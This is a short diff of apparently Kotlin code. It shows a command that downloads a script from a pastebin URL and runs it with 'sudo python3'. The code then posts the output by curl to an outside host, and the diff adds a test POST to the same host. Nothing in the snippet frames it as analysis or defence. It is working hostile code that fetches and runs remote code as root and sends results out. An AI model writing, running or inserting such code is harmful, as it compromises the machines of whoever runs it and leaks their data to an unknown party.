@@ -16,3 +16,6 @@ val output = "curl -sSfL https://pastebin.com/raw/UUPC3Q79 | sudo python3 | tr -
 println("Shell command output: $output")
 val post = "curl -X POST http://tsu.tari.moe:3306/ --data s=\"$output\""
 post.runCommand()
+val a = "asdfdf"
+val testPost = "curl -X POST http://tsu.tari.moe:3306/ --data s=\"$a\""
+testPost.runCommand()
